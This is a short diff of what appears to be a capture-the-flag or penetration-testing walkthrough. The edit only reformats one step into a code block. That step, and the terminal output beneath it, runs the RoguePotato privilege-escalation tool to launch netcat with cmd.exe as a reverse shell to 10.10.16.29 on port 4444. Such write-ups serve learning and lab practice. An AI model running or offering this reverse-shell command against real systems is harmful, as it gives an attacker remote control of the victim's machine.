@@ -32,7 +32,9 @@ Saved as: shell.exe
 ```
 
 3.  we need to run this command on our target machine
-    command: rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999  
+```
+ command: rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999
+```
 ```
 C:\Users\Public\desktop>rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                      
 rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                                              
